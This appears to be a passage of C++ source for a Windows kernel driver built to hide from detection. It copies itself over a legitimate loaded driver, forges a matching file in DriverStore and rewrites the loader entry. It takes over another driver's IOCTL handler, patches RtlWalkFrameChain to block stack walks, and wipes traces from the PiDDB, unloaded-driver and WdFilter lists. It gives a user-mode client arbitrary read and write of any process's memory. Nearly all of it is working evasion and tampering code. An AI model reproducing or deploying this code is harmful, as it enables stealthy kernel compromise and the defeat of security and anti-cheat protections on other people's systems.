        if (nt->Signature == IMAGE_NT_SIGNATURE) {
            PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
            for (USHORT s = 0; s < nt->FileHeader.NumberOfSections; s++, sec++) {
                if (sec->Characteristics & IMAGE_SCN_CNT_CODE)    continue;
                if (!(sec->Characteristics & IMAGE_SCN_MEM_WRITE)) continue;
                PUCHAR sbase = (PUCHAR)ntBase + sec->VirtualAddress;
                SIZE_T ssize = sec->Misc.VirtualSize;
                for (SIZE_T j = 0; j + sizeof(PVOID) <= ssize; j += sizeof(PVOID)) {
                    if (!MmIsAddressValid(sbase + j)) continue;
                    if (*(PVOID*)(sbase + j) == target)
                        return (void**)(sbase + j);
                }
            }
        }
    }
    return nullptr;
}

static VOID InstallWalkChainHook(PVOID ntBase) {
    // Strategy 1: Find indirect pointer (older builds / retpoline builds)
    void** ptr = FindRtlWalkFrameChainPtr(ntBase);
    if (ptr) {
        PUCHAR base; SIZE_T size;
        if (!GetImageSection(ntBase, ".text", &base, &size)) return;
        static const UCHAR pat[] = { 0x33, 0xC0, 0xC3 };
        PVOID gadget = PatternScan(base, size, pat, sizeof(pat));
        if (!gadget) return;
        g_state->pWalkChainPtr = ptr;
        g_state->origWalkChain = InterlockedExchangePointer(ptr, gadget);
        g_state->drvStatus.WalkChainHooked = 1;
        g_state->drvStatus.WalkChainUsedGadget = 1;
        g_state->drvStatus.WalkChainGadgetVA = (ULONGLONG)gadget;
        g_state->drvStatus.WalkChainPtrVA = (ULONGLONG)ptr;
        return;
    }

    // Strategy 2: Patch the function prologue directly (newer builds)
    // Write "xor eax, eax; ret" (33 C0 C3) over the first 3 bytes via MDL remap
    UNICODE_STRING name = RTL_CONSTANT_STRING(L"RtlWalkFrameChain");
    PUCHAR fn = (PUCHAR)MmGetSystemRoutineAddress(&name);
    if (!fn) return;

    PMDL mdl = IoAllocateMdl(fn, 16, FALSE, FALSE, NULL);
    if (!mdl) return;
    NTSTATUS st = STATUS_UNSUCCESSFUL;
    __try { MmProbeAndLockPages(mdl, KernelMode, IoReadAccess); st = STATUS_SUCCESS; }
    __except (EXCEPTION_EXECUTE_HANDLER) {}
    if (!NT_SUCCESS(st)) { IoFreeMdl(mdl); return; }

    PUCHAR mapped = (PUCHAR)MmMapLockedPagesSpecifyCache(
        mdl, KernelMode, MmNonCached, NULL, FALSE, NormalPagePriority);
    if (mapped) {
        if (NT_SUCCESS(MmProtectMdlSystemAddress(mdl, PAGE_EXECUTE_READWRITE))) {
            // Save original bytes for potential restore
            g_state->origWalkChain = (void*)(*(UINT64*)fn);  // save first 8 bytes
            g_state->pWalkChainPtr = (void**)fn;             // remember where we patched
            // xor eax, eax; ret
            mapped[0] = 0x33;
            mapped[1] = 0xC0;
            mapped[2] = 0xC3;
            g_state->drvStatus.WalkChainHooked = 1;
            g_state->drvStatus.WalkChainUsedGadget = 0;  // inline patch, not gadget
            g_state->drvStatus.WalkChainGadgetVA = (ULONGLONG)fn;
            g_state->drvStatus.WalkChainPtrVA = (ULONGLONG)fn;
        }
        MmUnmapLockedPages(mapped, mdl);
    }
    MmUnlockPages(mdl);
    IoFreeMdl(mdl);
}

// ============================================================================
// Code cave + MDL write helpers
// ============================================================================

static BOOLEAN WritePhysPage(PVOID dstVa, PVOID srcVa, SIZE_T size) {
    PMDL mdl = IoAllocateMdl(dstVa, (ULONG)size, FALSE, FALSE, NULL);
    if (!mdl) return FALSE;
    NTSTATUS st = STATUS_UNSUCCESSFUL;
    __try { MmProbeAndLockPages(mdl, KernelMode, IoReadAccess); st = STATUS_SUCCESS; }
    __except (EXCEPTION_EXECUTE_HANDLER) {}
    if (!NT_SUCCESS(st)) { IoFreeMdl(mdl); return FALSE; }
    PUCHAR mapped = (PUCHAR)MmMapLockedPagesSpecifyCache(mdl, KernelMode, MmNonCached, NULL, FALSE, NormalPagePriority);
    if (mapped) {
        if (NT_SUCCESS(MmProtectMdlSystemAddress(mdl, PAGE_EXECUTE_READWRITE))) {
            RtlCopyMemory(mapped, srcVa, size); st = STATUS_SUCCESS;
        } else st = STATUS_UNSUCCESSFUL;
        MmUnmapLockedPages(mapped, mdl);
    } else st = STATUS_INSUFFICIENT_RESOURCES;
    MmUnlockPages(mdl); IoFreeMdl(mdl);
    return NT_SUCCESS(st);
}

// ============================================================================
// Dynamic host driver selection
// ============================================================================

static const WCHAR* const kHostCandidates[] = {
    L"\\Driver\\Beep", L"\\Driver\\pcw", L"\\Driver\\mup",
    L"\\Driver\\rdyboost", L"\\Driver\\volsnap",
};

static PDRIVER_OBJECT FindSuitableHost() {
    for (ULONG i = 0; i < ARRAYSIZE(kHostCandidates); i++) {
        UNICODE_STRING name; RtlInitUnicodeString(&name, kHostCandidates[i]);
        PDRIVER_OBJECT drv = nullptr;
        NTSTATUS st = ObReferenceObjectByName(&name, OBJ_CASE_INSENSITIVE, nullptr, 0,
            *IoDriverObjectType, KernelMode, nullptr, (PVOID*)&drv);
        if (NT_SUCCESS(st) && drv && drv->DeviceObject) {
            g_state->drvStatus.HostDriver = i + 1;
            return drv;
        }
        if (drv) ObDereferenceObject(drv);
    }
    return nullptr;
}

// ============================================================================
// Dynamic stomp target selection
// ============================================================================

struct STOMP_CANDIDATE { const WCHAR* Name; ULONG MinSize; };
static const STOMP_CANDIDATE kStompTargets[] = {
    { L"bowser.sys",  0x18000 },
    { L"Ndu.sys",     0x18000 },
    { L"volsnap.sys", 0x30000 },
    { L"clfs.sys",    0x30000 },
    { L"cng.sys",     0x40000 },
};

static PLDR_DATA_TABLE_ENTRY SelectStompTarget(PVOID ntBase, ULONG requiredSize) {
    for (ULONG i = 0; i < ARRAYSIZE(kStompTargets); i++) {
        PLDR_DATA_TABLE_ENTRY ldr = FindModuleLdrEntry(ntBase, kStompTargets[i].Name);
        if (!ldr || !ldr->DllBase) continue;
        if (ldr->SizeOfImage < requiredSize) continue;
        PIMAGE_NT_HEADERS nt = RtlImageNtHeader(ldr->DllBase);
        if (!nt || nt->FileHeader.NumberOfSections < 3) continue;
        g_state->drvStatus.StompTarget = i + 1;
        return ldr;
    }
    return nullptr;
}

// ============================================================================
// Disk sync + LDR poison
// ============================================================================

static BOOLEAN WriteStomedImageToNewFile(PVOID stageData, ULONG stageSize,
                                          PLDR_DATA_TABLE_ENTRY targetLdr) {
    LARGE_INTEGER tsc; KeQueryTickCount(&tsc);
    ULONG seed1 = (ULONG)(tsc.QuadPart ^ (ULONG_PTR)IoGetCurrentProcess() ^ kBuildSeed);
    ULONG seed2 = (ULONG)((tsc.QuadPart >> 17) ^ (kBuildSeed * 0x41C64E6D));
    WCHAR baseName[32] = {};
    USHORT baseLen = targetLdr->BaseDllName.Length / sizeof(WCHAR);
    if (baseLen > 20) baseLen = 20;
    for (USHORT i = 0; i < baseLen; i++) {
        WCHAR c = targetLdr->BaseDllName.Buffer[i];
        if (c == L'.') break;
        baseName[i] = c;
    }
    // Real DriverStore format: <name>.inf_amd64_<16 hex chars>
    WCHAR dirPath[280] = {};
    WcsAppend(dirPath, ARRAYSIZE(dirPath), L"\\SystemRoot\\System32\\DriverStore\\FileRepository\\");
    WcsAppend(dirPath, ARRAYSIZE(dirPath), baseName);
    WcsAppend(dirPath, ARRAYSIZE(dirPath), L".inf_amd64_");
    WcsAppendHex32(dirPath, ARRAYSIZE(dirPath), seed1);
    WcsAppendHex32(dirPath, ARRAYSIZE(dirPath), seed2);

    UNICODE_STRING dirStr; RtlInitUnicodeString(&dirStr, dirPath);
    OBJECT_ATTRIBUTES oa; IO_STATUS_BLOCK iosb = {};
    InitializeObjectAttributes(&oa, &dirStr, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
    HANDLE hDir = NULL;
    ZwCreateFile(&hDir, FILE_LIST_DIRECTORY | SYNCHRONIZE, &oa, &iosb, NULL,
                 FILE_ATTRIBUTE_DIRECTORY, FILE_SHARE_READ | FILE_SHARE_WRITE,
                 FILE_OPEN_IF, FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
    if (hDir) ZwClose(hDir);

    RtlZeroMemory(g_state->stompFilePath, sizeof(g_state->stompFilePath));
    WcsAppend(g_state->stompFilePath, ARRAYSIZE(g_state->stompFilePath), dirPath);
    WcsAppend(g_state->stompFilePath, ARRAYSIZE(g_state->stompFilePath), L"\\");
    WcsAppendN(g_state->stompFilePath, ARRAYSIZE(g_state->stompFilePath),
               targetLdr->BaseDllName.Buffer, targetLdr->BaseDllName.Length / sizeof(WCHAR));

    UNICODE_STRING filePath; RtlInitUnicodeString(&filePath, g_state->stompFilePath);
    InitializeObjectAttributes(&oa, &filePath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
    HANDLE hFile = NULL;
    NTSTATUS st = ZwCreateFile(&hFile, FILE_WRITE_DATA | SYNCHRONIZE, &oa, &iosb, NULL,
        FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_SUPERSEDE,
        FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
    if (!NT_SUCCESS(st)) return FALSE;
    LARGE_INTEGER offset = {};
    st = ZwWriteFile(hFile, NULL, NULL, NULL, &iosb, stageData, stageSize, &offset, NULL);
    ZwClose(hFile);
    if (!NT_SUCCESS(st)) return FALSE;

    g_state->savedFullDllName = targetLdr->FullDllName;
    g_state->savedBaseDllName = targetLdr->BaseDllName;
    g_state->poisonedLdr = targetLdr;
    RtlInitUnicodeString(&targetLdr->FullDllName, g_state->stompFilePath);
    g_state->drvStatus.DiskSynced = 1;
    return TRUE;
}

// ============================================================================
// Pool stomp
// ============================================================================

static PVOID StompIntoTarget(PVOID ntBase, PVOID selfBase, PLDR_DATA_TABLE_ENTRY targetLdr) {
    PIMAGE_NT_HEADERS selfNt = RtlImageNtHeader(selfBase);
    if (!selfNt) return nullptr;
    ULONG imageSize = selfNt->OptionalHeader.SizeOfImage;
    if (!imageSize) return nullptr;
    PVOID targetBase = targetLdr->DllBase;
    if (targetLdr->SizeOfImage < imageSize) return nullptr;
    PIMAGE_NT_HEADERS origNt = RtlImageNtHeader(targetBase);

    PVOID stage = ExAllocatePoolWithTag(NonPagedPool, imageSize, TAG_STAGE);
    if (!stage) return nullptr;
    RtlCopyMemory(stage, selfBase, imageSize);

    // Relocate
    LONGLONG delta = (LONGLONG)((ULONG_PTR)targetBase - (ULONG_PTR)selfBase);
    if (delta != 0) {
        PIMAGE_NT_HEADERS stNt = RtlImageNtHeader(stage);
        if (stNt) {
            ULONG relocRva = stNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
            ULONG relocSz = stNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
            if (relocRva && relocSz) {
                PIMAGE_BASE_RELOCATION blk = (PIMAGE_BASE_RELOCATION)((PUCHAR)stage + relocRva);
                PIMAGE_BASE_RELOCATION end = (PIMAGE_BASE_RELOCATION)((PUCHAR)blk + relocSz);
                while (blk < end && blk->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION)) {
                    ULONG cnt = (blk->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
                    PUSHORT ents = (PUSHORT)(blk + 1);
                    PUCHAR base = (PUCHAR)stage + blk->VirtualAddress;
                    for (ULONG i = 0; i < cnt; i++) {
                        if ((ents[i] >> 12) == IMAGE_REL_BASED_DIR64)
                            *(LONGLONG*)(base + (ents[i] & 0x0FFF)) += delta;
                    }
                    blk = (PIMAGE_BASE_RELOCATION)((PUCHAR)blk + blk->SizeOfBlock);
                }
            }
        }
    }

    // Patch headers to match original
    if (origNt) {
        PIMAGE_NT_HEADERS stNt = RtlImageNtHeader(stage);
        if (stNt) {
            stNt->FileHeader.TimeDateStamp = origNt->FileHeader.TimeDateStamp;
            stNt->FileHeader.Characteristics = origNt->FileHeader.Characteristics;
            stNt->OptionalHeader.ImageBase = origNt->OptionalHeader.ImageBase;
            stNt->OptionalHeader.SizeOfImage = origNt->OptionalHeader.SizeOfImage;
            stNt->OptionalHeader.SizeOfCode = origNt->OptionalHeader.SizeOfCode;
            stNt->OptionalHeader.CheckSum = origNt->OptionalHeader.CheckSum;
            g_state->drvStatus.HdrPatched = 1;
            USHORT origSections = origNt->FileHeader.NumberOfSections;
            PIMAGE_SECTION_HEADER origSec = IMAGE_FIRST_SECTION(origNt);
            PIMAGE_SECTION_HEADER stageSec = IMAGE_FIRST_SECTION(stNt);
            ULONG_PTR secOff = (ULONG_PTR)stageSec - (ULONG_PTR)stage;
            ULONG hdrSz = stNt->OptionalHeader.SizeOfHeaders;
            USHORT maxFit = (secOff < hdrSz) ? (USHORT)((hdrSz - secOff) / sizeof(IMAGE_SECTION_HEADER)) : 0;
            USHORT copyCount = (origSections < maxFit) ? origSections : maxFit;
            USHORT stageSections = stNt->FileHeader.NumberOfSections;
            RtlCopyMemory(stageSec, origSec, copyCount * sizeof(IMAGE_SECTION_HEADER));
            if (stageSections > copyCount)
                RtlZeroMemory(stageSec + copyCount,
                              (stageSections - copyCount) * sizeof(IMAGE_SECTION_HEADER));
            stNt->FileHeader.NumberOfSections = copyCount;
            stNt->OptionalHeader.SizeOfHeaders = origNt->OptionalHeader.SizeOfHeaders;
            g_state->drvStatus.SectionHdrPatched = 1;
        }
    }

    WriteStomedImageToNewFile(stage, imageSize, targetLdr);

    // Write to target page by page
    BOOLEAN ok = TRUE;
    for (SIZE_T off = 0; off < imageSize; off += PAGE_SIZE) {
        SIZE_T chunk = min((SIZE_T)PAGE_SIZE, imageSize - off);
        if (!WritePhysPage((PUCHAR)targetBase + off, (PUCHAR)stage + off, chunk)) { ok = FALSE; break; }
    }
    ExFreePoolWithTag(stage, TAG_STAGE);
    return ok ? targetBase : nullptr;
}

// ============================================================================
// IOCTL dispatch — all state accessed via g_state pointer (reads from RO .data are fine)
// ============================================================================

static VOID ProcessCommPacket(COMM_PACKET* pkt) {
    switch (pkt->Operation) {
    case COMM_OP_INIT_TARGET: {
        if (g_state->cachedProcess) { ObDereferenceObject(g_state->cachedProcess); g_state->cachedProcess = nullptr; }
        pkt->Status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)pkt->ProcessId, &g_state->cachedProcess);
        if (NT_SUCCESS(pkt->Status)) {
            g_state->cachedDirBase = *(UINT64*)((PUCHAR)g_state->cachedProcess + 0x28);
            g_state->drvStatus.PhysicalRW = 1;
        }
        break;
    }
    case COMM_OP_READ:
        if (!pkt->Size || pkt->Size > COMM_MAX_SIZE || !g_state->cachedDirBase) { pkt->Status = STATUS_INVALID_PARAMETER; break; }
        pkt->Status = PhysicalRead(g_state->cachedDirBase, pkt->AddressSrc, (PVOID)pkt->AddressDst, pkt->Size);
        break;
    case COMM_OP_WRITE:
        if (!pkt->Size || pkt->Size > COMM_MAX_SIZE || !g_state->cachedDirBase) { pkt->Status = STATUS_INVALID_PARAMETER; break; }
        pkt->Status = PhysicalWrite(g_state->cachedDirBase, pkt->AddressDst, (PVOID)pkt->AddressSrc, pkt->Size);
        break;
    case COMM_OP_GET_BASE:
        if (!g_state->cachedProcess) {
            pkt->Status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)pkt->ProcessId, &g_state->cachedProcess);
            if (NT_SUCCESS(pkt->Status)) g_state->cachedDirBase = *(UINT64*)((PUCHAR)g_state->cachedProcess + 0x28);
        }
        if (g_state->cachedProcess) {
            pkt->AddressDst = (ULONGLONG)PsGetProcessSectionBaseAddress(g_state->cachedProcess);
            pkt->Status = pkt->AddressDst ? STATUS_SUCCESS : STATUS_NOT_FOUND;
        } else pkt->Status = STATUS_NOT_FOUND;
        break;
    case COMM_OP_GET_MODULE:
        pkt->ModuleName[255] = '\0';
        if (!g_state->cachedProcess || !g_state->cachedDirBase) { pkt->Status = STATUS_NOT_FOUND; break; }
        { UINT64 base = FindProcessModule(g_state->cachedProcess, g_state->cachedDirBase, pkt->ModuleName);
          pkt->AddressDst = base; pkt->Status = base ? STATUS_SUCCESS : STATUS_NOT_FOUND; }
        break;
    case COMM_OP_GET_STATUS:
        if (pkt->ProcessId == (ULONG)COMM_HANDSHAKE_MAGIC) { pkt->Status = (LONG)COMM_HANDSHAKE_REPLY; break; }
        { BYPASS_STATUS snap = g_state->drvStatus;
          if (g_state->pWalkChainPtr && snap.WalkChainHooked) {
              void* cur = *(void* volatile*)g_state->pWalkChainPtr;
              snap.WalkChainSlotVA = (ULONGLONG)cur;
              snap.WalkChainActive = (cur == (void*)snap.WalkChainGadgetVA) ? 1 : 0;
          }
          if (g_state->mmUnloadedArr) {
              DECL_VEHICLE_NAME();
              BOOLEAN found = FALSE;
              for (ULONG i = 0; i < 50 && !found; i++)
                  if (g_state->mmUnloadedArr[i].Name.Buffer && RtlEqualUnicodeString(&g_state->mmUnloadedArr[i].Name, &vehicleName, TRUE)) found = TRUE;
              snap.VehicleUnloadedLive = found ? 0 : 1;
          }
          RtlCopyMemory(pkt->ModuleName, &snap, sizeof(BYPASS_STATUS));
          pkt->Status = STATUS_SUCCESS; }
        break;
    case COMM_OP_CLEAN_VEHICLE:
        { DECL_VEHICLE_NAME();
          if (g_state->ntBase) ClearUnloadedEntryByName(g_state->ntBase, &vehicleName);
          pkt->Status = g_state->ntBase ? STATUS_SUCCESS : STATUS_NOT_FOUND; }
        break;
    default: pkt->Status = STATUS_INVALID_PARAMETER; break;
    }
}

static NTSTATUS DispatchIoctl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
    if (stack->Parameters.DeviceIoControl.IoControlCode == IOCTL_COMM) {
        ULONG inLen = stack->Parameters.DeviceIoControl.InputBufferLength;
        ULONG outLen = stack->Parameters.DeviceIoControl.OutputBufferLength;
        NTSTATUS status = STATUS_BUFFER_TOO_SMALL; ULONG_PTR info = 0;
        if (inLen >= sizeof(COMM_PACKET) && outLen >= sizeof(COMM_PACKET)) {
            ProcessCommPacket((COMM_PACKET*)Irp->AssociatedIrp.SystemBuffer);
            info = sizeof(COMM_PACKET); status = STATUS_SUCCESS;
        }
        Irp->IoStatus.Status = status; Irp->IoStatus.Information = info;
        IoCompleteRequest(Irp, IO_NO_INCREMENT); return status;
    }
    // Not our IOCTL — forward to original handler
    if (g_state->origDevCtrl) return g_state->origDevCtrl(DeviceObject, Irp);
    Irp->IoStatus.Status = STATUS_INVALID_DEVICE_REQUEST; Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT); return STATUS_INVALID_DEVICE_REQUEST;
}

// ============================================================================
// Deferred cleanup
// ============================================================================

static VOID DeferredCleanupCallback(PVOID ctx) {
    CLEANUP_WORK* w = (CLEANUP_WORK*)ctx;
    PVOID ntBase = w->NtBase;
    if (!ntBase) return;
    DECL_VEHICLE_NAME();
    for (ULONG attempt = 0; attempt < 5 && !g_state->drvStatus.VehicleUnloadedCleared; attempt++) {
        ClearUnloadedEntryByName(ntBase, &vehicleName);
        if (!g_state->drvStatus.VehicleUnloadedCleared) {
            LARGE_INTEGER wait; wait.QuadPart = -20000000LL;
            KeDelayExecutionThread(KernelMode, FALSE, &wait);
        }
    }
    ClearPiDDBEntryByName(ntBase, &vehicleName);
    ClearKernelHashBucketList(ntBase);
    ClearWdFilterDriverList(ntBase);
    InstallWalkChainHook(ntBase);
    g_state->drvStatus.DeferredCleanupDone = 1;
}

// ============================================================================
// DriverEntry
// ============================================================================

extern "C" NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject,
                                 _In_ PUNICODE_STRING RegistryPath) {
    UNREFERENCED_PARAMETER(RegistryPath);
    UNREFERENCED_PARAMETER(DriverObject);

    // Allocate mutable state in NonPagedPool — always writable, survives stomp
    g_state = (DRIVER_STATE*)ExAllocatePoolWithTag(NonPagedPool, sizeof(DRIVER_STATE), TAG_STATE);
    if (!g_state) return STATUS_INSUFFICIENT_RESOURCES;
    RtlZeroMemory(g_state, sizeof(DRIVER_STATE));

    PVOID ntBase = GetNtKernelBaseAlt();

    g_state->drvStatus.KDUPath = 1;
    g_state->drvStatus.NtBase = (ULONGLONG)ntBase;
    g_state->ntBase = ntBase;

    PVOID selfBase = FindSelfBase((PVOID)(ULONG_PTR)DriverEntry);
    PVOID newBase = nullptr;

    if (selfBase && ntBase) {
        PIMAGE_NT_HEADERS selfNt = RtlImageNtHeader(selfBase);
        ULONG requiredSize = selfNt ? selfNt->OptionalHeader.SizeOfImage : 0;
        PLDR_DATA_TABLE_ENTRY stompLdr = SelectStompTarget(ntBase, requiredSize);
        if (stompLdr) {
            newBase = StompIntoTarget(ntBase, selfBase, stompLdr);
            if (newBase) {
                g_state->drvStatus.PoolStomped = 1;
                g_state->mmUnloadedArr = FindMmUnloadedArray(ntBase);
            }
        }
    }

    // Setup communication — host is separate from stomp target
    PDRIVER_OBJECT pDevOwner = FindSuitableHost();
    if (!pDevOwner) return STATUS_SUCCESS;
    g_state->borrowedDrv = pDevOwner;
    g_state->origDevCtrl = pDevOwner->MajorFunction[IRP_MJ_DEVICE_CONTROL];
    g_state->pDevice = pDevOwner->DeviceObject;

    // Dispatch points into stomped image
    PDRIVER_DISPATCH dispFn = DispatchIoctl;
    if (newBase && selfBase) {
        LONGLONG delta = (LONGLONG)((ULONG_PTR)newBase - (ULONG_PTR)selfBase);
        dispFn = (PDRIVER_DISPATCH)((PUCHAR)DispatchIoctl + delta);
    }

    pDevOwner->MajorFunction[IRP_MJ_DEVICE_CONTROL] = dispFn;

    // Deferred cleanup — callback must point to STOMPED code
    if (ntBase) {
        g_state->cleanupWork.NtBase = ntBase;
        PWORKER_THREAD_ROUTINE cleanupFn = DeferredCleanupCallback;
        if (newBase && selfBase) {
            LONGLONG d = (LONGLONG)((ULONG_PTR)newBase - (ULONG_PTR)selfBase);
            cleanupFn = (PWORKER_THREAD_ROUTINE)((PUCHAR)DeferredCleanupCallback + d);
        }
        ExInitializeWorkItem(&g_state->cleanupWork.Item, cleanupFn, &g_state->cleanupWork);
        ExQueueWorkItem(&g_state->cleanupWork.Item, DelayedWorkQueue);
    }

    // Scrub pool LAST — after all pool-based code is done
    if (newBase && selfBase) {
        PIMAGE_NT_HEADERS selfNt = RtlImageNtHeader(selfBase);
        if (selfNt) {
            g_state->drvStatus.PoolScrubbed = 1;
            ULONG imageSize = selfNt->OptionalHeader.SizeOfImage;
            ULONG_PTR imageStart = (ULONG_PTR)selfBase;
            ULONG_PTR currentPage = (ULONG_PTR)DriverEntry & ~0xFFFULL;

            if (currentPage >= imageStart && currentPage < imageStart + imageSize) {
                if (currentPage > imageStart)
                    RtlZeroMemory((PVOID)imageStart, (SIZE_T)(currentPage - imageStart));
                ULONG_PTR nextPage = currentPage + PAGE_SIZE;
                if (nextPage < imageStart + imageSize)
                    RtlZeroMemory((PVOID)nextPage, (SIZE_T)(imageStart + imageSize - nextPage));
            } else {
                RtlZeroMemory(selfBase, imageSize);
            }
        }
    }

    return STATUS_SUCCESS;
}
